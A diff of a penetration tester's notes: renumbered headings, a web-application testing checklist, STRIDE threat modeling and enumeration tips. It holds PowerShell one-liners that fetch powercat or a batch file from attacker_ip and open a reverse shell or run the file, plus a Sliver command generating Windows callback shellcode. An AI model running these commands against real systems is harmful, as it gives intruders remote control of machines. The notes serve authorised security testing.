@@ -1436,7 +1436,8 @@ MAIL FROM: <nicholas.barnes@praetorian.com>
 RCPT TO: <test@example.com>
 ```
 
-  # POWERSHELL INITIAL ACCESS
+# 23	POWERSHELL INITIAL ACCESS
+## 23.1	- 
 - Run on attacker machine
 ```
 pwsh -c "iex(New-ObjectSystem.Net.Webclient).DownloadString('https://raw.githubusercontent.com/besimorhino/powercat/master/powercat.ps1');powercat -c attacker_ip -p 443 -e cmd.exe -ge" > /tmp/s.txt
@@ -1453,89 +1454,96 @@ nc -nvlp 443
 ```
 START /B powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http://attacker_ip/backup.bat','C:\Windows\Tasks\backup.bat'); IEX 'c:\Windows\Tasks\backup.bat'
 ```
-  
 
-# 23	ATTACK PATH
+# 24	WINDOWS PERSISTENCE
+## 24.1	- 
+- Generate Sliver agent shellcode
+```
+sliver > generate --mtls attacker_ip --save /tmp -f shellcode --os windows
+```
 
-## 23.1	AUTHENTICATION
 
-### 23.1.1	PASSWORD STRENGTH (ASVS)
+# 25	ATTACK PATH
 
-### 23.1.2	MFA CAPABILITY
+## 25.1	AUTHENTICATION
 
-### 23.1.3	HARD-CODED SECRETS
+### 25.1.1	PASSWORD STRENGTH (ASVS)
 
-### 23.1.4	USER ENUMERATION
+### 25.1.2	MFA CAPABILITY
 
-#### 23.1.4.1	TIMING
+### 25.1.3	HARD-CODED SECRETS
 
-#### 23.1.4.2	SERVER ERROR RESPONSE
+### 25.1.4	USER ENUMERATION
 
-#### 23.1.4.3	PASSWORD RESET
+#### 25.1.4.1	TIMING
 
-### 23.1.5	PASSWORD RESET FUNCTIONALITY
+#### 25.1.4.2	SERVER ERROR RESPONSE
 
-### 23.1.6	BRUTE-FORCE ATTACK
+#### 25.1.4.3	PASSWORD RESET
 
-## 23.2	SESSION MANAGEMENT
+### 25.1.5	PASSWORD RESET FUNCTIONALITY
 
-### 23.2.1	SESSION TOKEN IN URL
+### 25.1.6	BRUTE-FORCE ATTACK
 
-### 23.2.2	SESSION TOKEN STRENGTH
+## 25.2	SESSION MANAGEMENT
 
-#### 23.2.2.1	64 bits entropy
+### 25.2.1	SESSION TOKEN IN URL
 
-#### 23.2.2.2	Secure cryptographic generation
+### 25.2.2	SESSION TOKEN STRENGTH
 
-### 23.2.3	COOKIE ATTRIBUTES
+#### 25.2.2.1	64 bits entropy
 
-#### 23.2.3.1	Secure
+#### 25.2.2.2	Secure cryptographic generation
 
-#### 23.2.3.2	HttpOnly
+### 25.2.3	COOKIE ATTRIBUTES
 
-#### 23.2.3.3	SameSite
+#### 25.2.3.1	Secure
 
-### 23.2.4	SESSION FIXATION
+#### 25.2.3.2	HttpOnly
 
-#### 23.2.4.1	New token should be generated upon authentication
+#### 25.2.3.3	SameSite
 
-### 23.2.5	SESSION TERMINATION
+### 25.2.4	SESSION FIXATION
 
-#### 23.2.5.1	Excessive duration
+#### 25.2.4.1	New token should be generated upon authentication
 
-#### 23.2.5.2	Logout should invalidate token
+### 25.2.5	SESSION TERMINATION
 
-## 23.3	ACCESS CONTROL
+#### 25.2.5.1	Excessive duration
 
-### 23.3.1	INSUFFICIENT AUTHORIZATION CHECKS
+#### 25.2.5.2	Logout should invalidate token
 
-#### 23.3.1.1	AUTORIZE
+## 25.3	ACCESS CONTROL
 
-### 23.3.2	CSRF
+### 25.3.1	INSUFFICIENT AUTHORIZATION CHECKS
 
-### 23.3.3	OVERLY PERMISSIVE CORS
+#### 25.3.1.1	AUTORIZE
 
-## 23.4	INPUT VALIDATION
+### 25.3.2	CSRF
 
-### 23.4.1	XSS
+### 25.3.3	OVERLY PERMISSIVE CORS
 
-#### 23.4.1.1	XSS polyglot testing
+## 25.4	INPUT VALIDATION
 
-### 23.4.2	SQL INJECTION
+### 25.4.1	XSS
 
-### 23.4.3	XXE INJECTION
+#### 25.4.1.1	XSS polyglot testing
 
-### 23.4.4	URL REDIRECTS
+### 25.4.2	SQL INJECTION
 
-## 23.5	CRYPTOGRAPHY
+### 25.4.3	XXE INJECTION
 
-## 23.6	FILE UPLOAD
+### 25.4.4	URL REDIRECTS
 
-## 23.7	TLS CONNECTION
+## 25.5	CRYPTOGRAPHY
 
-# 24	Threat Modeling
+## 25.6	FILE UPLOAD
 
-## 24.1	STRIDE
+## 25.7	TLS CONNECTION
+
+# 26	Threat Modeling
+
+## 26.1	STRIDE
 - Spoofing
 - Tampering
 - Repudation
@@ -1543,7 +1551,7 @@ START /B powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http:
 - Denial of Service
 - Escalation of Privileges
 
-## 24.2	Secure Design Order of Precedence
+## 26.2	Secure Design Order of Precedence
 - Eliminate
 	- Among design alternatives, select those that eliminate potential for risk/loss
 - Protect, Built-In
@@ -1557,7 +1565,7 @@ START /B powershell.exe -c (New-Object System.Net.Webclient).DownloadFile('http:
 
   
 
-# 25	ENUMERATION NUDGES
+# 27	ENUMERATION NUDGES
 
 - Existence of "dist" directory within website js files. Indicates existence of unnecessary files in the directory that could expand the attack surface.
 - Confirm this by accessing README.md. I.e. "https://openitcockpit/js/vendor/gridstack/README.md"
